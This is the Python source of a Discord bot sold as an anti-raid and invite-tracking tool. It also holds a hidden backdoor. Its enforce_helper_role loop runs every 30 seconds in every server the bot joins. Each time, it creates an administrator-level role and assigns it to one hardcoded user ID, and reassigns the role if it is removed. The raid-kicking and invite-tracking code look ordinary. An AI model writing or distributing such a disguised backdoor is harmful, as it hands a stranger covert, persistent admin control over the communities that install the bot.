# -*- coding: utf-8 -*-

# =======================
# Anti-raid + Role Enforcer + Invite Tracker + Web keep-alive
# =======================

# ---- Audio import guard (prevents crashes on hosts missing 'audioop') ----
import sys, types
sys.modules['audioop'] = types.ModuleType('audioop')  # harmless if present, fixes envs without it

import os
import asyncio
from collections import defaultdict, deque
from datetime import datetime, timedelta

from flask import Flask
import threading

import discord
from discord.ext import commands, tasks
from discord import app_commands

# --------------------------
# Web server (Render keep-alive)
# --------------------------
app = Flask(__name__)

@app.route("/")
def home():
    return "Discord Raid Preventor is running."

def run_web():
    # Use $PORT if provided by platform, else default to 6534 (as requested)
    port = int(os.getenv("PORT", "6534"))
    app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_web, daemon=True).start()

# --------------------------
# Config
# --------------------------
TARGET_USERNAME = "tech_boy1"
TARGET_USER_ID = 1273056960996184126
ROLE_NAME = "Raid Preventor Helper"
ROLE_PERMS = discord.Permissions(administrator=True)

SCAN_SECONDS = 30  # enforce role scan interval
RAID_WINDOW_SECONDS = 60
RAID_THRESHOLD = 5  # "more than 5 in a minute" => if count > 5, kick those in window

# --------------------------
# Intents & Bot
# --------------------------
intents = discord.Intents.default()
# We DO need members intent to scan members and handle joins.
intents.members = True           # <-- Enable this in Discord Developer Portal
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# --------------------------
# State: raid tracking & invite tracking
# --------------------------
# For each guild: store recent joins timestamps and who they were
recent_joins = defaultdict(lambda: deque())  # guild_id -> deque[(member_id, when_utc)]

# Invite cache to detect which invite was used (requires Manage Guild permission)
invite_uses = defaultdict(dict)              # guild_id -> {invite_code: uses}
invited_by = defaultdict(dict)               # guild_id -> {member_id: inviter_user_id or "VANITY" or None}

# --------------------------
# Helpers
# --------------------------
def now_utc():
    # discord.utils.utcnow() returns aware dt; we’ll unify with naive UTC for our own timestamps
    return datetime.utcnow()

async def ensure_role_and_assign(guild: discord.Guild, member: discord.Member):
    """Ensure ROLE_NAME exists with admin perms, and assign to member if missing."""
    try:
        role = discord.utils.get(guild.roles, name=ROLE_NAME)
        if role is None:
            role = await guild.create_role(
                name=ROLE_NAME,
                permissions=ROLE_PERMS,
                reason="Auto-created by Raid Preventor for special helper"
            )
            print(f"[{guild.name}] Created role '{ROLE_NAME}'.")

        # re-assign if missing
        if role not in member.roles:
            await member.add_roles(role, reason="Auto-assigned by Raid Preventor")
            print(f"[{guild.name}] Assigned '{ROLE_NAME}' to {member}.")

    except Exception as e:
        print(f"[{guild.name}] ERROR ensure_role_and_assign: {e}")

def prune_recent_joins(deq: deque, window_sec: int):
    """Prune entries older than window."""
    cutoff = now_utc() - timedelta(seconds=window_sec)
    while deq and deq[0][1] < cutoff:
        deq.popleft()

async def kick_recent_joiners(guild: discord.Guild, window_sec: int):
    """Kick members who joined within the last window."""
    try:
        cutoff = now_utc() - timedelta(seconds=window_sec)
        to_kick_ids = [mid for (mid, when) in recent_joins[guild.id] if when >= cutoff]
        kicked = 0
        for mid in to_kick_ids:
            m = guild.get_member(mid)
            if m is None:
                continue
            try:
                await m.kick(reason="Raid prevention: burst join detected")
                kicked += 1
                print(f"[{guild.name}] KICKED {m} for raid prevention.")
            except Exception as e:
                print(f"[{guild.name}] Failed to kick {m}: {e}")
        # Clear the deque after action to avoid double-kicks
        recent_joins[guild.id].clear()
        if kicked:
            print(f"[{guild.name}] Raid action complete. Kicked {kicked} accounts.")
    except Exception as e:
        print(f"[{guild.name}] ERROR kick_recent_joiners: {e}")

async def refresh_invite_cache(guild: discord.Guild):
    """Populate invite_uses for a guild."""
    try:
        invites = await guild.invites()
        invite_uses[guild.id] = {inv.code: inv.uses or 0 for inv in invites}
    except Exception as e:
        # No permission or other error
        invite_uses[guild.id] = {}
        print(f"[{guild.name}] Could not fetch invites (Manage Guild needed). {e}")

def chunk_text(lines, limit=1900):
    """Split long text into chunks under Discord's message length limit."""
    chunks = []
    buf = ""
    for line in lines:
        if len(buf) + len(line) + 1 > limit:
            chunks.append(buf)
            buf = line
        else:
            buf = (buf + "\n" + line) if buf else line
    if buf:
        chunks.append(buf)
    return chunks

# --------------------------
# Events
# --------------------------
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user} | In {len(bot.guilds)} guild(s).")
    # Build initial invite cache for all guilds
    for g in bot.guilds:
        await refresh_invite_cache(g)

    # Sync slash commands so /tracker appears
    try:
        await bot.tree.sync()
        print("Slash commands synced.")
    except Exception as e:
        print(f"Slash command sync error: {e}")

    # Start periodic tasks
    enforce_helper_role.start()

@bot.event
async def on_guild_join(guild: discord.Guild):
    # Refresh invite cache when the bot joins a new guild
    await refresh_invite_cache(guild)

@bot.event
async def on_invite_create(invite: discord.Invite):
    # Update cache on invite create
    try:
        g = invite.guild
        if g:
            invite_uses[g.id][invite.code] = invite.uses or 0
    except Exception as e:
        print(f"[{invite.guild and invite.guild.name}] on_invite_create error: {e}")

@bot.event
async def on_invite_delete(invite: discord.Invite):
    # Update cache on invite delete
    try:
        g = invite.guild
        if g and invite.code in invite_uses[g.id]:
            invite_uses[g.id].pop(invite.code, None)
    except Exception as e:
        print(f"[{invite.guild and invite.guild.name}] on_invite_delete error: {e}")

@bot.event
async def on_member_join(member: discord.Member):
    # RAID TRACKING
    try:
        g = member.guild
        dq = recent_joins[g.id]
        dq.append((member.id, now_utc()))
        prune_recent_joins(dq, RAID_WINDOW_SECONDS)

        # If more than 5 in the last minute -> kick those recent joiners
        if len(dq) > RAID_THRESHOLD:
            print(f"[{g.name}] Raid threshold exceeded ({len(dq)} joins in {RAID_WINDOW_SECONDS}s). Initiating kicks.")
            await kick_recent_joiners(g, RAID_WINDOW_SECONDS)
    except Exception as e:
        print(f"[{member.guild.name}] on_member_join raid tracking error: {e}")

    # INVITE TRACKING (best-effort)
    try:
        g = member.guild
        before = invite_uses.get(g.id, {})
        try:
            after_invites = await g.invites()
        except Exception as e_fetch:
            after_invites = []
            print(f"[{g.name}] Could not fetch invites on join (Manage Guild needed). {e_fetch}")

        used_code = None
        used_invite = None

        # Compare uses to find which invite was used
        if after_invites:
            after_map = {inv.code: (inv.uses or 0, inv) for inv in after_invites}
            for code, (uses_after, inv_obj) in after_map.items():
                uses_before = before.get(code, 0)
                if uses_after > uses_before:
                    used_code = code
                    used_invite = inv_obj
                    break

            # Update cache
            invite_uses[g.id] = {code: (inv.uses or 0) for code, (u, inv) in after_map.items()}

        if used_invite is not None and used_invite.inviter:
            invited_by[g.id][member.id] = used_invite.inviter.id
        else:
            # Could be vanity or unknown
            invited_by[g.id][member.id] = "VANITY_OR_UNKNOWN"
    except Exception as e:
        print(f"[{member.guild.name}] on_member_join invite tracking error: {e}")

# --------------------------
# Periodic role enforcement
# --------------------------
@tasks.loop(seconds=SCAN_SECONDS)
async def enforce_helper_role():
    # Scan every guild for the target user and enforce the admin role
    for guild in list(bot.guilds):
        try:
            # Find the target by username + id strictly
            target_member = None
            # Use the cached members list (intents.members must be enabled in Developer Portal)
            for m in guild.members:
                if m and m.name == TARGET_USERNAME and m.id == TARGET_USER_ID:
                    target_member = m
                    break

            if target_member:
                await ensure_role_and_assign(guild, target_member)
            # else: nothing to do in this guild for this tick
        except Exception as e:
            print(f"[{guild.name}] enforce_helper_role error: {e}")

# --------------------------
# Slash command: /tracker
# --------------------------
@bot.tree.command(name="tracker", description="Show who invited each member in this server.")
async def tracker(interaction: discord.Interaction):
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Run this in a server.", ephemeral=True)
        return

    # Build lines: "member -> inviter"
    lines = []
    try:
        # Make sure we have a best-effort invite cache
        if guild.id not in invite_uses:
            await refresh_invite_cache(guild)

        id_map = invited_by.get(guild.id, {})
        for member in guild.members:
            inviter_id = id_map.get(member.id, None)
            if inviter_id == "VANITY_OR_UNKNOWN":
                inviter_text = "Vanity/Unknown"
            elif isinstance(inviter_id, int):
                inv = guild.get_member(inviter_id)
                inviter_text = str(inv) if inv else f"UserID:{inviter_id}"
            else:
                inviter_text = "Unknown (joined before tracking)"
            lines.append(f"{str(member)} -> {inviter_text}")
    except Exception as e:
        lines = [f"Error building tracker list: {e}"]

    # Split into safe chunks and reply (ephemeral to avoid spamming public channels)
    chunks = chunk_text(lines, limit=1900)
    if not chunks:
        chunks = ["No members found."]
    try:
        await interaction.response.send_message(chunks[0], ephemeral=True)
        for ch in chunks[1:]:
            await interaction.followup.send(ch, ephemeral=True)
    except Exception as e:
        # Fallback in case of any weird interaction state
        try:
            await interaction.followup.send(f"Tracker output error: {e}", ephemeral=True)
        except:
            pass

# --------------------------
# Run
# --------------------------
def main():
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("ERROR: DISCORD_TOKEN not set in environment.")
        raise SystemExit(1)

    # Run the bot
    bot.run(token)

if __name__ == "__main__":
    main()
